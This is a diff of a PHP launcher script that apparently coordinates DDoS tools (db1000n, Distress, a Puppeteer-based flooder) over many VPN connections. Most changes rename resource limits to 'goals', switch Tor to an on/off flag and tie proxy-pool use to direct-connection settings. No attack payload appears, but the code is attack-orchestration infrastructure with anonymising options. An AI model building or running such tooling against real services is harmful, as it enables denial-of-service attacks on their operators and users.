@@ -9,12 +9,17 @@ cleanTmpDir();
 require_once __DIR__ . '/composer/vendor/autoload.php';
 require_once __DIR__ . '/Config.php';
 require_once __DIR__ . '/Efficiency.php';
+
+require_once __DIR__ . '/resources-consumption/NetworkConsumption.php';
 require_once __DIR__ . '/resources-consumption/LinuxResources.php';
 require_once __DIR__ . '/resources-consumption/ResourcesConsumption.php';
+require_once __DIR__ . '/resources-consumption/TimeTracking.php';
+
 require_once __DIR__ . '/open-vpn/OpenVpnCommon.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConfig.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConnectionBase.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConnectionStatic.php';
+require_once __DIR__ . '/open-vpn/ConnectionQualityTest.php';
 require_once __DIR__ . '/open-vpn/OpenVpnConnection.php';
 require_once __DIR__ . '/open-vpn/OpenVpnProvider.php';
 require_once __DIR__ . '/open-vpn/OpenVpnStatistics.php';
@@ -22,14 +27,20 @@ require_once __DIR__ . '/open-vpn/OpenVpnStatistics.php';
 require_once __DIR__ . '/HackApplication.php';
 require_once __DIR__ . '/1000/db1000nApplicationStatic.php';
 require_once __DIR__ . '/1000/db1000nApplication.php';
+
+require_once __DIR__ . '/DST/DistressGetConfig.php';
 require_once __DIR__ . '/DST/DistressGetTargetsFile.php';
 require_once __DIR__ . '/DST/DistressApplicationStatic.php';
 require_once __DIR__ . '/DST/DistressApplication.php';
+
 require_once __DIR__ . '/puppeteer-ddos/BrainServerLauncher.php';
 require_once __DIR__ . '/puppeteer-ddos/PuppeteerApplicationStatic.php';
 require_once __DIR__ . '/puppeteer-ddos/PuppeteerApplication.php';
 
 //-------------------------------------------------------
+
+$STDIN = fopen('php://stdin', 'r');
+stream_set_blocking($STDIN, false);
 
 $LOG_WIDTH = 115;
 $LOG_PADDING_LEFT = 2;
@@ -81,10 +92,10 @@ function calculateResources()
     $IS_IN_DOCKER,
     $DOCKER_HOST,
     $OS_RAM_CAPACITY,
-    $MAX_RAM_USAGE,
+    $RAM_USAGE_GOAL,
     $CPU_CORES_QUANTITY,
-    $CPU_USAGE_LIMIT,
-    $NETWORK_USAGE_LIMIT,
+    $CPU_USAGE_GOAL,
+    $NETWORK_USAGE_GOAL,
     $EACH_VPN_BANDWIDTH_MAX_BURST,
     $ONE_SESSION_MIN_DURATION,
     $ONE_SESSION_MAX_DURATION,
@@ -105,7 +116,7 @@ function calculateResources()
     $DISTRESS_SCALE,
     $DISTRESS_CPU_AND_RAM_LIMIT,
     $DISTRESS_DIRECT_CONNECTIONS_PERCENT,
-    $DISTRESS_TOR_CONNECTIONS_PER_TARGET,
+    $DISTRESS_USE_TOR,
     $DISTRESS_USE_PROXY_POOL,
 
     $USE_X100_COMMUNITY_TARGETS,
@@ -154,30 +165,30 @@ function calculateResources()
 
     //--
 
-    $CPU_USAGE_LIMIT = val(Config::$data, 'cpuUsageLimit');
-    $CPU_USAGE_LIMIT = Config::filterOptionValuePercents($CPU_USAGE_LIMIT, 10, 100);
-    $CPU_USAGE_LIMIT = $CPU_USAGE_LIMIT === null  ?  Config::$dataDefault['cpuUsageLimit'] : $CPU_USAGE_LIMIT;
-    if ($CPU_USAGE_LIMIT !== Config::$dataDefault['cpuUsageLimit']) {
-        $addToLog[] = "Cpu usage limit: $CPU_USAGE_LIMIT";
+    $CPU_USAGE_GOAL = val(Config::$data, 'cpuUsageGoal');
+    $CPU_USAGE_GOAL = Config::filterOptionValuePercents($CPU_USAGE_GOAL, 10, 100);
+    $CPU_USAGE_GOAL = $CPU_USAGE_GOAL === null  ?  Config::$dataDefault['cpuUsageGoal'] : $CPU_USAGE_GOAL;
+    if ($CPU_USAGE_GOAL !== Config::$dataDefault['cpuUsageGoal']) {
+        $addToLog[] = "Cpu usage goal: $CPU_USAGE_GOAL";
     }
 
     //--
 
-    $ramUsageLimit = val(Config::$data, 'ramUsageLimit');
-    $ramUsageLimit = Config::filterOptionValuePercents($ramUsageLimit, 10, 100);
-    $ramUsageLimit = $ramUsageLimit === null  ?  Config::$dataDefault['ramUsageLimit'] : $ramUsageLimit;
-    if ($ramUsageLimit !== Config::$dataDefault['ramUsageLimit']) {
-        $addToLog[] = "Ram usage limit: $ramUsageLimit";
+    $RAM_USAGE_GOAL = val(Config::$data, 'ramUsageGoal');
+    $RAM_USAGE_GOAL = Config::filterOptionValuePercents($RAM_USAGE_GOAL, 10, 100);
+    $RAM_USAGE_GOAL = $RAM_USAGE_GOAL === null  ?  Config::$dataDefault['ramUsageGoal'] : $RAM_USAGE_GOAL;
+    if ($RAM_USAGE_GOAL !== Config::$dataDefault['ramUsageGoal']) {
+        $addToLog[] = "Ram usage goal: $RAM_USAGE_GOAL";
     }
-    $MAX_RAM_USAGE = roundLarge(intval($ramUsageLimit) / 100 * $OS_RAM_CAPACITY);
+
 
     //--
 
-    $NETWORK_USAGE_LIMIT = val(Config::$data, 'networkUsageLimit');
-    $NETWORK_USAGE_LIMIT = Config::filterOptionValueIntPercents($NETWORK_USAGE_LIMIT, 0, 100000, 0, 100);
-    $NETWORK_USAGE_LIMIT = $NETWORK_USAGE_LIMIT === null  ?  Config::$dataDefault['networkUsageLimit'] : $NETWORK_USAGE_LIMIT;
-    if ($NETWORK_USAGE_LIMIT !==  Config::$dataDefault['networkUsageLimit']) {
-        $addToLog[] = 'Network usage limit: ' . ($NETWORK_USAGE_LIMIT  ?: 'no limit');
+    $NETWORK_USAGE_GOAL = val(Config::$data, 'networkUsageGoal');
+    $NETWORK_USAGE_GOAL = Config::filterOptionValueIntPercents($NETWORK_USAGE_GOAL, 0, 100000, 0, 100);
+    $NETWORK_USAGE_GOAL = $NETWORK_USAGE_GOAL === null  ?  Config::$dataDefault['networkUsageGoal'] : $NETWORK_USAGE_GOAL;
+    if ($NETWORK_USAGE_GOAL !==  Config::$dataDefault['networkUsageGoal']) {
+        $addToLog[] = 'Network usage goal: ' . ($NETWORK_USAGE_GOAL  ?: 'no limit');
     }
 
     //--
@@ -273,24 +284,28 @@ function calculateResources()
         $addToLog[] = "Distress Cpu and Ram usage limit: $DISTRESS_CPU_AND_RAM_LIMIT";
     }
 
-    $DISTRESS_DIRECT_CONNECTIONS_PERCENT = val(Config::$data, 'distressDirectConnectionsPercent');
-    $DISTRESS_DIRECT_CONNECTIONS_PERCENT = Config::filterOptionValuePercents($DISTRESS_DIRECT_CONNECTIONS_PERCENT, 0, 100);
-    $DISTRESS_DIRECT_CONNECTIONS_PERCENT = $DISTRESS_DIRECT_CONNECTIONS_PERCENT === null  ?  Config::$dataDefault['distressDirectConnectionsPercent'] : $DISTRESS_DIRECT_CONNECTIONS_PERCENT;
-    if ($DISTRESS_DIRECT_CONNECTIONS_PERCENT !== Config::$dataDefault['distressDirectConnectionsPercent']) {
-        $addToLog[] = "Distress direct connections percent: $DISTRESS_DIRECT_CONNECTIONS_PERCENT";
-    }
-
-    $DISTRESS_TOR_CONNECTIONS_PER_TARGET = val(Config::$data, 'distressTorConnectionsPerTarget');
-    $DISTRESS_TOR_CONNECTIONS_PER_TARGET = Config::filterOptionValueInt($DISTRESS_TOR_CONNECTIONS_PER_TARGET, 0, 100);
-    $DISTRESS_TOR_CONNECTIONS_PER_TARGET = $DISTRESS_TOR_CONNECTIONS_PER_TARGET === null  ?  Config::$dataDefault['distressTorConnectionsPerTarget'] : $DISTRESS_TOR_CONNECTIONS_PER_TARGET;
-    if ($DISTRESS_TOR_CONNECTIONS_PER_TARGET !== Config::$dataDefault['distressTorConnectionsPerTarget']) {
-        $addToLog[] = "Distress Tor connections per target: $DISTRESS_TOR_CONNECTIONS_PER_TARGET";
+    $DISTRESS_USE_TOR = val(Config::$data, 'distressUseTor');
+    $DISTRESS_USE_TOR = boolval(Config::filterOptionValueBoolean($DISTRESS_USE_TOR));
+    if ($DISTRESS_USE_TOR != Config::$dataDefault['distressUseTor']) {
+        $addToLog[] = 'Distress use Tor: '. ( $DISTRESS_USE_TOR ? 'true' : 'false');
     }
 
     $DISTRESS_USE_PROXY_POOL = val(Config::$data, 'distressUseProxyPool');
     $DISTRESS_USE_PROXY_POOL = boolval(Config::filterOptionValueBoolean($DISTRESS_USE_PROXY_POOL));
     if ($DISTRESS_USE_PROXY_POOL != Config::$dataDefault['distressUseProxyPool']) {
-        $addToLog[] = 'Distress use proxy pool from Mhddos: ' . ($DISTRESS_USE_PROXY_POOL ? 'true' : 'false');
+        $addToLog[] = 'Distress use proxy pool: ' . ($DISTRESS_USE_PROXY_POOL ? 'true' : 'false');
+    }
+
+    if ($DISTRESS_USE_PROXY_POOL) {
+        $DISTRESS_DIRECT_CONNECTIONS_PERCENT = val(Config::$data, 'distressDirectConnectionsPercent');
+        $DISTRESS_DIRECT_CONNECTIONS_PERCENT = Config::filterOptionValuePercents($DISTRESS_DIRECT_CONNECTIONS_PERCENT, 0, 100);
+    } else {
+        $DISTRESS_DIRECT_CONNECTIONS_PERCENT = '100%';
+    }
+
+    $DISTRESS_DIRECT_CONNECTIONS_PERCENT = $DISTRESS_DIRECT_CONNECTIONS_PERCENT === null  ?  Config::$dataDefault['distressDirectConnectionsPercent'] : $DISTRESS_DIRECT_CONNECTIONS_PERCENT;
+    if ($DISTRESS_DIRECT_CONNECTIONS_PERCENT !== Config::$dataDefault['distressDirectConnectionsPercent']) {
+        $addToLog[] = "Distress direct connections percent: $DISTRESS_DIRECT_CONNECTIONS_PERCENT";
     }
 
     //-------
@@ -358,12 +373,13 @@ function calculateResources()
     if ($FIXED_VPN_QUANTITY) {
         $PARALLEL_VPN_CONNECTIONS_QUANTITY_INITIAL = $FIXED_VPN_QUANTITY;
     } else {
-        $connectionsLimitByCpu = intRound($CPU_CORES_QUANTITY * (intval($CPU_USAGE_LIMIT) / 100) * $VPN_QUANTITY_PER_CPU);
-        MainLog::log("Allowed to use $CPU_USAGE_LIMIT of $CPU_CORES_QUANTITY installed CPU core(s). This grants $connectionsLimitByCpu parallel VPN connections");
+        $connectionsLimitByCpu = intRound($CPU_CORES_QUANTITY * (intval($CPU_USAGE_GOAL) / 100) * $VPN_QUANTITY_PER_CPU);
+        MainLog::log("Allowed to use $CPU_USAGE_GOAL of $CPU_CORES_QUANTITY installed CPU core(s). This grants $connectionsLimitByCpu parallel VPN connections");
 
-        $connectionsLimitByRam = round(($MAX_RAM_USAGE - ($IS_IN_DOCKER  ?  0.25 : 0.75)) * $VPN_QUANTITY_PER_1_GIB_RAM);
+        $maxRamUsage = roundLarge(intval($RAM_USAGE_GOAL) / 100 * $OS_RAM_CAPACITY);
+        $connectionsLimitByRam = round(($maxRamUsage - ($IS_IN_DOCKER  ?  0.25 : 0.75)) * $VPN_QUANTITY_PER_1_GIB_RAM);
         $connectionsLimitByRam = $connectionsLimitByRam < 1  ?  0 : $connectionsLimitByRam;
-        MainLog::log("Allowed to use $MAX_RAM_USAGE of $OS_RAM_CAPACITY GiB installed RAM. This grants $connectionsLimitByRam parallel VPN connections");
+        MainLog::log("Allowed to use $maxRamUsage of $OS_RAM_CAPACITY GiB installed RAM. This grants $connectionsLimitByRam parallel VPN connections");
 
         $vpnQuantityLimitPossibleValues = [
             'Limit by CPU'          => $connectionsLimitByCpu,
@@ -435,10 +451,11 @@ function initSession()
     if ($SESSIONS_COUNT === 1) {
         Actions::doFilter('InitSessionResourcesCorrection', []);
     } else {
-        ResourcesConsumption::calculateNetworkBandwidthLimit();
+        NetworkConsumption::calculateNetworkBandwidthLimit();
         $usageValues = ResourcesConsumption::previousSessionUsageValues();
 
         MainLog::log('System      average  CPU   usage during previous session was ' . padPercent($usageValues['systemAverageCpuUsage']['current']) . " of {$CPU_CORES_QUANTITY} core(s) installed", 1, 1);
+        MainLog::log('System      peak     CPU   usage during previous session was ' . padPercent($usageValues['systemPeakCpuUsage']['current']));
         MainLog::log('System      average  RAM   usage during previous session was ' . padPercent($usageValues['systemAverageRamUsage']['current']) . " of {$OS_RAM_CAPACITY}GiB installed");
         MainLog::log('System      peak     RAM   usage during previous session was ' . padPercent($usageValues['systemPeakRamUsage']['current']));
         MainLog::log('System      average  SWAP  usage during previous session was ' . padPercent($usageValues['systemAverageSwapUsage']['current']) . " of " . humanBytes(LinuxResources::getSystemSwapCapacity()) . " available");
@@ -446,12 +463,12 @@ function initSession()
         MainLog::log('System      average  TMP   usage during previous session was ' . padPercent($usageValues['systemAverageTmpUsage']['current']) . " of " . humanBytes(LinuxResources::getSystemTmpCapacity()) . " available");
         MainLog::log('System      peak     TMP   usage during previous session was ' . padPercent($usageValues['systemPeakTmpUsage']['current']));
 
-        if (isset($usageValues['systemTopNetworkUsageReceive'])) {
+        if (isset($usageValues['systemAverageNetworkUsageReceive'])) {
             $netUsageMessageTitle = 'System      top  network   usage during previous session was: ';
             $netUsageMessage = $netUsageMessageTitle
-                . 'upload   ' . padPercent($usageValues['systemTopNetworkUsageTransmit']['current']) . ' of ' . humanBytes(ResourcesConsumption::$transmitSpeedLimitBits, HUMAN_BYTES_BITS) . " allowed,\n"
+                . 'upload   ' . padPercent($usageValues['systemAverageNetworkUsageTransmit']['current']) . ' of ' . humanBytes(NetworkConsumption::$transmitSpeedLimitBits, HUMAN_BYTES_BITS) . " allowed,\n"
                 . str_repeat(' ', strlen($netUsageMessageTitle))
-                . 'download ' . padPercent($usageValues['systemTopNetworkUsageReceive']['current']) . ' of ' . humanBytes(ResourcesConsumption::$receiveSpeedLimitBits, HUMAN_BYTES_BITS) . ' allowed';
+                . 'download ' . padPercent($usageValues['systemAverageNetworkUsageReceive']['current']) . ' of ' . humanBytes(NetworkConsumption::$receiveSpeedLimitBits, HUMAN_BYTES_BITS) . ' allowed';
 
             MainLog::log($netUsageMessage);
         }
@@ -471,7 +488,7 @@ function initSession()
     Actions::doAction('AfterInitSession');
 
     if ($SESSIONS_COUNT === 1) {
-        ResourcesConsumption::calculateNetworkBandwidthLimit();
+        NetworkConsumption::calculateNetworkBandwidthLimit();
     }
 
     $CURRENT_SESSION_DURATION = rand($ONE_SESSION_MIN_DURATION, $ONE_SESSION_MAX_DURATION);
